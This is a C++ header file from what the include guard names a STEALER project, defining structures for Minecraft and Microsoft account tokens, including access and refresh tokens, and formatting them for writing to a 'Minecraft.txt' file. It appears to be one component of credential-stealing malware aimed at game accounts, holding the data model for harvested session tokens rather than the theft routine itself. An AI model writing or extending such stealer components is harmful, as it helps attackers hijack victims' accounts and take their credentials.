//
// Created by .1qxz on 11.06.2024.
//

#ifndef STEALER_MINECRAFTACCOUNT_H
#define STEALER_MINECRAFTACCOUNT_H

#include "Entity.h"

struct MinecraftToken {
    std::string accessToken;
    std::string expiresAt;
};

struct MicrosoftToken {
    std::string accessToken;
    std::string refreshToken;
    std::string expiresAt;
};

struct MinecraftAccount : public Entity {

    std::string username;
    MinecraftToken minecraftToken;
    MicrosoftToken microsoftToken;

    std::string toString() override {
        std::stringstream ss;

        ss << "Username: " << username << "\n";
        ss << "Tokens: " << "\n";
        ss << "  Minecraft: " << "\n";
        ss << "    Access token: " << minecraftToken.accessToken << "\n";
        ss << "    Expires at: " << minecraftToken.expiresAt << "\n";
        ss << "  Microsoft: " << "\n";
        ss << "    Access token: " << microsoftToken.accessToken << "\n";
        ss << "    Refresh token: " << microsoftToken.refreshToken << "\n";
        ss << "    Expires at: " << microsoftToken.expiresAt << "\n";

        return ss.str();
    }

    std::string getFileName() override {
        return "Minecraft.txt";
    }

    bool canBeWrite() override {
        return !(username.empty());
    }
};

#endif //STEALER_MINECRAFTACCOUNT_H
